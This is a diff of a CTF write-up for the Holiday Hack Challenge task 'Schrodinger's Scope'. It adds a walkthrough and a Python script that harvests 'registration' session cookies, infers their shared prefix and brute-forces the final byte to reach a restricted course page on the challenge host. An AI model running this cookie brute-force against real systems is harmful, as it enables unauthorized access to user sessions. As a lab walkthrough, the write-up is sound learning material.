@@ -141,7 +141,7 @@ By visting the link we just enabled I was presented with a search interface to s
 
 At the end of the course list there's an entry named _"GNOME 827 - Mischief Management"_ - clicking on that link lead me to: 
 
- ![Report In-Scope vulnerability](/images/act3/act3-schrodinger-9.png)
+![Report In-Scope vulnerability](/images/act3/act3-schrodinger-9.png)
 
 The popup offers three options:
 
@@ -151,20 +151,106 @@ The popup offers three options:
 
 At the same time it urges for me to report the vulnerability. And so I did. 
 
+### 
 
+Early in the game I found an endpoint, _/register/dev/dev_notes_, that gave me an _HTTP 403_ error. I decided it was time to revisit it to see if I now had access since I was logged in with the _testuser_ account. And so I had: 
+ 
+![I have access now](/images/act3/act3-schrodinger-10.png)
 
----
+From the looks of it I am to look for the _holiday behavor_ class, but it is _wip_ state. By looking back at the other classes for inspiration, I decided to just add _wip_ and specify the new class I was looking for in the url:
 
+```text
+/register/courses/wip/holiday_behavior
+```
 
-After finding the information disclosure, the onscreen gnomes hinted at this URL: `https://flask-schrodingers-scope-firestore.holidayhackchallenge.com/search/student_lookup?id=1da0186b-4709-4edc-80be-fe43675c480d`
+This brought me to another 403 error screen: 
 
-However, this is out of scope. 
+![Another 403 error screen](/images/act3/act3-schrodinger-11.png)
 
+It complained about invalid session registration value, so I took a look at the cookies: 
 
+![Cookies](/images/act3/act3-schrodinger-12.png)
 
-### XSS
+Interesting. The registration cookie contains a HEX, upon refreshing the pages multiple times I figures out this HEX code is not random as could be. I hacked together å Python script to find an assortion of HEX codes to see if it was a pattern somewhere. It was. Each HEX was prefixed with `eb72a05369dcb4`, and there were only 20 values or so in use. I then extended my Python script to calculate the full range of the last to HEX values, and then bruteforce my way in. The script ended up looking like this: 
 
-### Hints
+```python
+import requests
+from pprint import pprint
+
+schrodinger_token = "e5e15381-843b-43fb-90d7-8b9eacc6c00b"
+get_param_id = "4ed10eeb-35ae-4f83-91b3-3e0c90969799"
+url = f"https://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/?id={get_param_id}"
+
+with requests.Session() as s:
+    s.cookies.set(
+        name = "Schrodinger",
+        value = schrodinger_token
+    )    
+
+    registration_cookies = set()
+
+    for i in range (0, 50):
+        r = s.get(url)
+
+        registration_cookies.add(r.cookies.get("registration"))
+
+    print(len(registration_cookies))
+    pprint(registration_cookies)
+
+    min_value = min(registration_cookies)
+    prefix = min_value[:-2]
+    start = int(min_value[-2:], 16)
+
+    candidates = [
+        f"{prefix}{i:02x}"
+        for i in range(0x00, 0x100)
+    ]
+
+    candidates = []
+
+    for i in range(start, start + 0x100):
+        candidates.append(f"{prefix}{(i & 0xff):02x}")
+
+    length_candidates = len(candidates)
+    counter = 1
+
+    for candidate in candidates:
+        s.cookies.set(
+            name = "registration",
+            value = candidate
+        )
+
+        url = f"https://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/courses/wip/holiday_behavior?id={get_param_id}"
+        r = s.get(url)
+
+        if "403 Forbidden" in r.text:
+            print(f"[{counter}/{length_candidates}] Register: {candidate} => NOPE")
+        else:
+            print(f"[{counter}/{length_candidates} ] Register: {candidate} => YES")
+            break
+
+        counter += 1
+```
+
+The script found the desired cookie value after 11 tries: 
+
+![Finding the cookie value](/images/act3/act3-schrodinger-13.png)
+
+Then I just took this cookie value and edited the "registration" cookie in my browser and hit refresh: 
+
+![Finalizing](/images/act3/act3-schrodinger-14.png)
+
+Finalizing it I were given a nice diploma I could hang behind the refrigerator: 
+
+![A diploma](/images/act3/act3-schrodinger-15.png)
+
+## Kevin McFarland mission debrief
+
+> Well done - you’ve shown the wisdom to stay within scope, uncover what mattered, and respecting other testing boundaries.
+> 
+> That kind of discipline is what separates a real penetration tester from someone just poking around.
+
+## Hints
 
 1. Though it might be more interesting to start off trying clever techniques and exploits, always start with the simple stuff first, such as reviewing HTML source code and basic SQLi.
 
@@ -176,7 +262,3 @@ However, this is out of scope.
 
 5. As you test this with a tool like Burp Suite, resist temptations and stay true to the instructed path.
 
-
-## Kevin McFarland mission debrief
-
-> 
